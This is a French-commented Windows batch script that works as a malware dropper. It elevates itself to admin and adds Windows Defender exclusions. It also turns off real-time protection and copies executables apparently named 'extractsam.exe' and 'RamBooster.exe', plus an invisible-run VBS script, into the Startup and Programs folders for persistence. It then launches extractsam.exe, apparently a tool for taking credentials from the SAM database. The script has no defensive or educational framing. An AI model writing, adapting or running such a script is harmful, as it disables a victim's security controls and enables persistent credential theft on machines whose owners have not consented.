@echo off
:: Vérifier si admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Droits admin requis. Relance automatique...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

@echo off

:: Créer dossier temporaire
mkdir C:\tmp

:: Exclure certains éléments de Windows Defender
powershell -Command "Set-MpPreference -ExclusionPath 'C:\tmp'"
powershell -Command "Set-MpPreference -ExclusionExtension 'extractsam.exe'"
powershell -Command "Set-MpPreference -ExclusionExtension 'RamBooster.exe'"
powershell -Command "Set-MpPreference -DisableRealTimeMonitoring $true"

:: Définir les deux chemins potentiels pour Startup
set "STARTUP_EN=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "STARTUP_FR=%APPDATA%\Microsoft\Windows\Menu Démarrer\Programmes\Démarrer"

:: Définir les deux chemins potentiels pour Programmes
set "STARTUP_EN2=%APPDATA%\Microsoft\Windows\Start Menu\Programs"
set "STARTUP_FR2=%APPDATA%\Microsoft\Windows\Menu Démarrer\Programmes"

:: Déterminer lequel des deux dossiers existe
if exist "%STARTUP_EN%" (
    set "TARGET_STARTUP=%STARTUP_EN%"
) else if exist "%STARTUP_FR%" (
    set "TARGET_STARTUP=%STARTUP_FR%"
) else (
    echo [ERREUR] Aucun dossier de démarrage détecté.
    pause
    exit /b
)

:: Déterminer lequel des deux dossiers existe
if exist "%STARTUP_EN2%" (
    set "TARGET2_STARTUP=%STARTUP_EN2%"
) else if exist "%STARTUP_FR2%" (
    set "TARGET2_STARTUP=%STARTUP_FR2%"
) else (
    echo [ERREUR] Aucun dossier de démarrage détecté.
    pause
    exit /b
)

:: Copier les fichiers dans Programs
copy setup_env.bat "%TARGET2_STARTUP%"
copy RamBooster.exe "%TARGET2_STARTUP%"
copy extractsam.exe "%TARGET2_STARTUP%"

:: Copier RunInvisible.vbs dans le bon dossier de démarrage
copy RunInvisible.vbs "%TARGET_STARTUP%"

:: Lancer les exécutables si besoin
start "" "%TARGET2_STARTUP%\extractsam.exe"

pause
exit

